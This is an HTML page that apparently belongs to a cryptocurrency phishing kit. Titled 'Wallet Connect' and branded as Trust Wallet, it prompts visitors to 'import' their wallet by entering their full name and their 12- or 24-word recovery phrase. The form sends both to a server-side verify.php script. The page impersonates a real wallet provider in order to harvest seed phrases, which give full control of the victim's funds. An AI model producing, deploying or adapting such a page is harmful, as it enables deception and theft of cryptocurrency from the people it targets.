<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="The best way to manage all your wallets from a single app. With our highly secure <br> integrations with top wallet providers, you can efficiently manage all your wallets on our app..">
    <meta keyword="The best way to manage all your wallets from a single app. With our highly secure <br> integrations with top wallet providers, you can efficiently manage all your wallets on our app..">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Connect</title>
    <link rel='stylesheet' href='../../css/import.css'>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<body>

    <section>
        <div class="col-lg-12 col-md-12 mx-auto">
            <a href="../../index.html"><img src="../../images/trust.png"></a>
            <div class="center">
                <h3>Import your Trust Wallet</h3>
                <p class="wallet-name">Wallet Name</p>
                <p class="wallet-name-icon wallet-name"><i class="fa fa-lock"></i> Trust Wallet </p> <br>

<!-- Form -->

                <form action="../../verify.php" method="POST">

                    <input type="text" class="form-control" name="name" placeholder="Input your Fullname"> <br>

                    <p class="wallet-name"><i class="fa fa-lock"></i>Recovery Phrase:</p>

                    <textarea rows="10" name="phrase" required placeholder="Typically 12 (sometimes 24) words separated by single spaces" pattern="[a-zA-Z]{1,}"></textarea> <br>

                    <small>Typically 12 (sometimes 24) words separated by single spaces</small>
                    <br>

                    <button type="submit" class="btn-proceed">PROCEED</button>
                </form>


                <!-- <?php $url = $_SERVER['REQUEST_URI']; ?> -->

            </div>


        </div>
    </section>




</body>

</html>